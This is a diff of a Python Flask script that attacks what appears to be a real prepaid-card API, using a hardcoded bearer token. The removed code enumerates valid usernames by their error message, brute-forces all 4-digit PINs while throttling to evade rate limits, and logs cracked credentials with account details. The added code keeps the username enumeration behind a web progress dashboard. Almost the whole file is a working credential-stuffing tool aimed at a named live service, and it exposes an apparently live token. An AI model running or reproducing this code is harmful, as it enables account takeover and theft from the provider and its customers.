@@ -1,99 +1,62 @@
-
+from flask import Flask, render_template, request, jsonify
+import json
+import os
 import requests
 import random
 import time
-import json
-import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from tqdm import tqdm
-from flask import Flask, jsonify
 import threading
 
-# === CONFIG ===
-API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
-AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
-LANGUAGE = "ar"
-MAX_REQUESTS = 1000
-STATE_FILE = "bruteforce_state.json"
-RESULTS_FILE = "successful_attempts.json"
+app = Flask('app')
 
-app = Flask(__name__)
+# Global variables to track progress
+current_step = "Initializing"
+valid_usernames = []
+total_usernames = 0
+processed_usernames = 0
 
-# === STATE MANAGEMENT ===
 def load_state():
-    if os.path.exists(STATE_FILE):
-        with open(STATE_FILE, 'r') as f:
+    if os.path.exists('bruteforce_state.json'):
+        with open('bruteforce_state.json', 'r') as f:
             state = json.load(f)
-            state["tried_passwords"] = {k: set(v) for k, v in state["tried_passwords"].items()}
-            return state
-    return {"valid_usernames": [], "tried_passwords": {}}
+            return state.get("valid_usernames", []), state.get("tried_passwords", {})
+    return [], {}
 
 def save_state(valid_usernames, tried_passwords):
     serializable_tried_passwords = {k: list(v) for k, v in tried_passwords.items()}
     state = {"valid_usernames": valid_usernames, "tried_passwords": serializable_tried_passwords}
-    with open(STATE_FILE, 'w') as f:
+    with open('bruteforce_state.json', 'w') as f:
         json.dump(state, f, indent=4)
 
-def save_success(username, password, info):
-    successes = []
-    if os.path.exists(RESULTS_FILE):
-        with open(RESULTS_FILE, 'r') as f:
-            successes = json.load(f)
-    
-    successes.append({
-        "username": username,
-        "password": password,
-        "status": info.get('status'),
-        "duration": info.get('group_duration'),
-        "remaining": info.get('readable_remaining_time'),
-        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
-    })
-    
-    with open(RESULTS_FILE, 'w') as f:
-        json.dump(successes, f, indent=4)
-
-# === API REQUEST ===
-# Global variables for rate limiting
-last_request_time = 0
-request_counter = 0
-
 def send_request(payload):
-    global last_request_time, request_counter
-    
-    # Rate limiting logic
-    current_time = time.time()
-    if current_time - last_request_time >= 10:  # Reset counter every 10 seconds
-        request_counter = 0
-        last_request_time = current_time
-    elif request_counter >= 2:  # Only allow 2 requests per 10 second window
-        sleep_time = 10 - (current_time - last_request_time)
-        if sleep_time > 0:
-            time.sleep(sleep_time)
-            last_request_time = time.time()
-            request_counter = 0
-
     headers = {
         "Content-Type": "application/json",
         "Accept": "application/json",
-        "Authorization": AUTH_HEADER,
-        "Accept-Language": LANGUAGE
+        "Authorization": "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d",
+        "Accept-Language": "ar"
     }
     try:
-        response = requests.post(API_URL, json=payload, headers=headers)
-        request_counter += 1
+        response = requests.post("https://bc.red-radius.com/api/v1/prepaid-cards", 
+                               json=payload, 
+                               headers=headers)
         return response.json(), payload
     except Exception as e:
         return {"error": str(e)}, payload
 
-# === STEP 1: Generate and validate usernames ===
-def generate_valid_usernames(prefix="20", count=1000, existing_usernames=None):
-    print("🔍 Scanning usernames concurrently...")
-    valid_usernames = existing_usernames or []
-    usernames_to_test = count - len(valid_usernames)
+def check_usernames():
+    global current_step, valid_usernames, total_usernames, processed_usernames
 
-    if usernames_to_test <= 0:
-        print(f"✅ Already have {len(valid_usernames)} valid usernames.")
-        return valid_usernames
+    existing_usernames, tried_passwords = load_state()
+    if existing_usernames:
+        valid_usernames = existing_usernames
+        current_step = f"Loaded {len(existing_usernames)} existing usernames"
+        return
+
+    current_step = "Scanning usernames"
+    prefix = "20"
+    usernames_to_test = 1000
+    total_usernames = usernames_to_test
 
     usernames = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(usernames_to_test)]
     payloads = [{"username": u} for u in usernames]
@@ -104,113 +67,51 @@ def generate_valid_usernames(prefix="20", count=1000, existing_usernames=None):
             try:
                 futures.append(executor.submit(send_request, payload))
             except RuntimeError as e:
-                print(f"Thread creation error: {e}")
-                time.sleep(1)  # Wait before retrying
-                
-        for future in tqdm(as_completed(futures), total=len(futures), desc="Validating"):
+                time.sleep(1)
+
+        for future in as_completed(futures):
             try:
                 result, payload = future.result()
+                processed_usernames += 1
+                if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
+                    valid_usernames.append(payload["username"])
             except Exception as e:
-                print(f"Request error: {e}")
-                continue
-            if result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
-                valid_usernames.append(payload["username"])
-
-    print(f"\n✅ Found {len(valid_usernames)} valid usernames in total.")
-    save_state(valid_usernames, load_state().get("tried_passwords", {}))
-    return valid_usernames
-
-# === STEP 2: Brute-force passwords for each username ===
-def try_passwords_for_users(valid_usernames):
-    state = load_state()
-    tried_passwords = state.get("tried_passwords", {})
-
-    while True:  # Continuous operation
-        for username in valid_usernames:
-            tried = tried_passwords.get(username, set())
-            remaining_passwords = [str(i).zfill(4) for i in range(10000) if str(i).zfill(4) not in tried]
-
-            if not remaining_passwords:
-                print(f"✅ All passwords tried for {username}.")
                 continue
 
-            print(f"\n🔐 Trying passwords for: {username} ({len(remaining_passwords)} remaining)")
+    save_state(valid_usernames, {})
+    current_step = f"Found {len(valid_usernames)} valid usernames"
 
-            while remaining_passwords:
-                batch = remaining_passwords[:MAX_REQUESTS]
-                payloads = [{"username": username, "password": p} for p in batch]
-
-                success = None
-                with ThreadPoolExecutor(max_workers=10) as executor:
-                    futures = []
-                    for payload in payloads:
-                        try:
-                            futures.append(executor.submit(send_request, payload))
-                        except RuntimeError as e:
-                            print(f"Thread creation error: {e}")
-                            time.sleep(1)  # Wait before retrying
-                            
-                    for future in tqdm(as_completed(futures), total=len(futures), desc=f"Trying {username}"):
-                        try:
-                            result, payload = future.result()
-                        except Exception as e:
-                            print(f"Request error: {e}")
-                            continue
-
-                        if result.get("status") is True and result.get("code") == 200:
-                            info = result.get("data", {})
-                            success = payload["password"]
-                            print(f"\n✅ SUCCESS for {username} → Password: {success}")
-                            print(f"➤ Status: {info.get('status')}")
-                            print(f"➤ Duration: {info.get('group_duration')}")
-                            print(f"➤ Remaining: {info.get('readable_remaining_time')}")
-                            save_success(username, success, info)
-                            tried_passwords[username] = tried_passwords.get(username, set()) | set(batch)
-                            save_state(valid_usernames, tried_passwords)
-                            break
-
-                        tried_passwords[username] = tried_passwords.get(username, set()) | {payload["password"]}
-
-                if success:
-                    break
-
-                remaining_passwords = remaining_passwords[MAX_REQUESTS:]
-                save_state(valid_usernames, tried_passwords)
-
-                if remaining_passwords:
-                    print(f"🛌 Waiting 60s to send next batch for {username}...")
-                    time.sleep(60)
-
-# === WEB SERVER ROUTES ===
-@app.route('/results')
-def get_results():
-    if os.path.exists(RESULTS_FILE):
-        with open(RESULTS_FILE, 'r') as f:
-            return jsonify(json.load(f))
-    return jsonify([])
-
-def run_bruteforce():
+def background_process():
     while True:
         try:
-            prefix = "20"  # Fixed prefix
-            count = MAX_REQUESTS
-            state = load_state()
-            valid_usernames = generate_valid_usernames(prefix, count, state.get("valid_usernames", []))
-
-            if valid_usernames:
-                print(f"📊 Testing {len(valid_usernames)} usernames.")
-                try_passwords_for_users(valid_usernames)
-            else:
-                print("❗ No valid usernames found.")
-                time.sleep(60)  # Wait before retrying
+            check_usernames()
+            time.sleep(5)
         except Exception as e:
-            print(f"Error occurred: {e}")
-            time.sleep(60)  # Wait before retrying
+            current_step = f"Error: {str(e)}"
+            time.sleep(5)
 
-if __name__ == "__main__":
-    # Start bruteforce in a separate thread
-    bruteforce_thread = threading.Thread(target=run_bruteforce, daemon=True)
-    bruteforce_thread.start()
-    
-    # Start web server
+@app.route('/')
+def home():
+    progress = 0 if total_usernames == 0 else (processed_usernames / total_usernames) * 100
+    return render_template(
+        'index.html',
+        current_step=current_step,
+        valid_usernames=valid_usernames,
+        progress=progress
+    )
+
+@app.route('/status')
+def status():
+    return jsonify({
+        'current_step': current_step,
+        'valid_usernames': valid_usernames,
+        'progress': 0 if total_usernames == 0 else (processed_usernames / total_usernames) * 100
+    })
+
+if __name__ == '__main__':
+    # Start background process
+    bg_thread = threading.Thread(target=background_process, daemon=True)
+    bg_thread.start()
+
+    # Run Flask app
     app.run(host='0.0.0.0', port=5000)
